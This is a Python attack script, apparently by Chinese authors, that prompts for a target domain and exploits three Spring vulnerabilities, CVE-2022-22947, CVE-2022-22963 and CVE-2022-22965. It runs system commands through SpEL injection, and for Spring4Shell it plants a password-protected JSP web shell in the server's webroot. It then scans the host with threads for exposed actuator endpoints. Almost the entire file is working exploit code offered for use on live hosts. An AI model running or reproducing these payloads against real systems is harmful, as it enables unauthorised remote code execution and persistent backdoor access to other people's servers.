#coding:utf-8
import requests
import json
import colorama
from colorama import init
import time
import queue
import sys
import urllib3
import threading
init(autoreset=True)
url=input("输入想要日的域名:")
print("")
##暂时只有Sping系列的信息泄露、cve-2022-22947、cve-2022-22963、cve-2022-22965
##by Skr11lex & 一江明月

###############################################################################################################################


headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Content-Type': 'application/json'
}
routename="Ss"
data = {"id": routename,
             "filters": [{"name": "AddResponseHeader",
             "args": {"name": "Result",
             "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
             "uri": "http://hello.com"}
r=requests.post(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
if r.status_code==201:
    #print("[+]存在CVE-2022-22947漏洞："+url+"/actuator/gateway/routes/"+routename)
    r=requests.post(url+"actuator/gateway/refresh",headers=headers,data=json.dumps(data))
    if r.status_code==200:
        #print("[+]刷新成功")
        r=requests.get(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
        if r.status_code==200:
            print(colorama.Fore.CYAN+"[+]"+url+"存在CVE-2022-22947漏洞，输出结果")
            a=r.json()
            print(colorama.Fore.CYAN+a['filters'][0].split("'")[1])
else:
    print(url+"不存在CVE-2022-22947漏洞")
print("################################")
print("################################")


payload = f'T(java.lang.Runtime).getRuntime().exec("{"whoami"}")'
headers2 = {
    'spring.cloud.function.routing-expression': payload,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
path = '/functionRouter'
data = 'test'
r1 = requests.post(url=url+path, headers=headers2, data=data,)
if r1.status_code == 500:
    print(colorama.Fore.CYAN+"[+]" + url + "可能存在CVE-2022-22963漏洞(有几率误报，须手动测试)")
else:
    print("[-]"+url+"目标不存在CVE-2022-22963漏洞")



print("################################")
print("################################")

headers3 = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}
url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
r=requests.get(url=url1,headers=headers3)
if r.status_code==200:
    print(colorama.Fore.CYAN+"[+]"+url+"目标存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
else:
    print("[-]"+url+"目标不存在CVE-2022-22965漏洞")


print("Spring敏感接口扫描开始")
def get_path(url,file = "mulu.txt"):
    path_queue = queue.Queue()
    f = open(file, "r", encoding="gbk")
    for i in f.readlines():
        path = url + i.strip()
        path_queue.put(path)
    f.close()
    return path_queue


def get_url(path_queue):
    while not path_queue.empty():
        try:
            url = path_queue.get()
            http = urllib3.PoolManager()
            respone = http.request('GET', url)
            if respone.status == 200:
                #print("[%d] => %s" % (respone.status, url))
                print("以下URL可能存在Spring boot信息泄露")
                print( url)
        except:
            pass
    else:
        sys.exit()

def main(url, threadNum):
    path_queue = get_path(url)
    threads = []
    for i in range(threadNum):
        t = threading.Thread(target=get_url, args=(path_queue, ))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    #1.输入Url和线程大小
    start = time.time()

    url = url
    #threadnum = int(input("输入线程数量: "))
    threadnum=15
    main(url, threadnum)
    end = time.time()
    print("总共耗时 %.2f" % (end-start))
    colorama.init()


print("扫描完毕")

end=input('按任意键退出')
